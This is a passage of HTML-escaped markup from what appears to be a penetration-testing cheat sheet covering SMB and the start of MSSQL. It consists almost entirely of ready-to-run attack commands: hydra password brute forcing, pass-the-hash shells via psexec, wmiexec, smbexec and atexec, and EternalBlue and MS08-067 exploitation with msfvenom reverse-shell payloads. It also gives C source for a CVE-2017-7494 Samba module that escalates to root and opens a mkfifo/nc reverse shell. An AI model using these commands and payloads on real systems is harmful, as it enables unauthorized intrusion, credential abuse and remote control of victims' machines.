punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E smb:\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u -vV\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"mount-a-smb-share\"\u003EMount a SMB share\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Emkdir \u002Ftmp\u002Fshare\nsudo mount -t cifs \u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u002Ftmp\u002Fshare\nsudo mount -t cifs -o 'username=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E,password=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E'\u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u002Ftmp\u002Fshare\n\nsmbclient \u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nsmbclient \u002F\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ESHARE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -U \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"get-a-shell\"\u003EGet a shell\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epsexec.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\npsexec.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -hashes :\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENTHASH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\nwmiexec.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nwmiexec.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -hashes :\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENTHASH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\nsmbexec.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\nsmbexec.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -hashes :\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENTHASH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\natexec.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E:\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ECOMMAND\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\natexec.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EDOMAIN\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u002F\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E@\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -hashes :\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENTHASH\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"eternalblue-ms17-010\"\u003EEternalBlue (MS17-010)\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehttps:\u002F\u002Fgithub.com\u002F3ndG4me\u002FAutoBlue-MS17-010\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"check-if-vulnerable\"\u003ECheck if vulnerable\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epython eternal_checker.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"prepare-shellcodes-and-listeners\"\u003EPrepare shellcodes and listeners\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ecd shellcode\n.\u002Fshell_prep.sh\ncd ..\n.\u002Flistener_prep.sh\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"exploit\"\u003EExploit\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epython eternalblue_exploit\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENUMBER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E shellcode\u002Fsc_all.bin\n\nMay need to run it multiple times\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch4 id=\"if-this-doesnt-work-try-this-one\"\u003EIf this doesn&#39;t work, try this one\u003C\u002Fh4\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Epython zzz_exploit.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"ms08-067\"\u003EMS08-067\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Download exploit code\ngit clone https:\u002F\u002Fgithub.com\u002Fandyacer\u002Fms08_067.git\n\n# Generate payload\nmsfvenom -p windows\u002Fshell_reverse_tcp LHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows\nmsfvenom -p windows\u002Fshell_bind_tcp RHOST=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E LPORT=\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows\n\n# Modify\nModify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.\n\n# Listener\nnc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Exploit\npython ms08_067_2018.py \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ENUMBER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E 445\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"cve-2017-7494\"\u003ECVE-2017-7494\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Download exploit code\ngit clone https:\u002F\u002Fgithub.com\u002Fjoxeankoret\u002FCVE-2017-7494\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003ECreate a new file named poc.c :\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E#include \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Estdio.h\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n#include \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Estdlib.h\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\nint samba_init_module(void)\n{\n    setresuid(0,0,0);\n    system(\"ping -c 3 \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\");\n}\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Build\ngcc -o test.so -shared poc.c -fPIC\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Start an ICMP listener\nsudo tcpdump -i \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EINTERFACE\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E icmp\n\n# Exploit\n.\u002Fcve_2017_7494.py -t \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETARGET_IP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E --custom=test.so\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EIf you reiceve 3 pings on your listener then the exploit works. Now let&#39;s get a shell :\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E#include \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Estdio.h\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n#include \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Estdlib.h\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\nint samba_init_module(void)\n{\n    setresuid(0,0,0);\n    system(\"rm \u002Ftmp\u002Ff;mkfifo \u002Ftmp\u002Ff;cat \u002Ftmp\u002Ff|\u002Fbin\u002Fsh -i 2\u003E&amp;1|nc \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003E\u002Ftmp\u002Ff\");\n}\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Build\ngcc -o test.so -shared poc.c -fPIC\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E# Start a listener\nnc -lvp \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPORT\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\n# Exploit\n.\u002Fcve_2017_7494.py -t \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003ETARGET_IP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -u \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSER\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORD\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E --custom=test.so\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Chr\u003E\n\u003Ch2 id=\"mssql---1433\"\u003EMSSQL - 1433\u003C\u002Fh2\u003E\n\u003Ch3 id=\"get-information\"\u003EGet information\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Enmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EIP\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch3 id=\"brute-force-5\"\u003EBrute force\u003C\u002Fh3\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Ehydra -L \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EUSERS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E -P \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003EPASSWORDS_LIST\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token 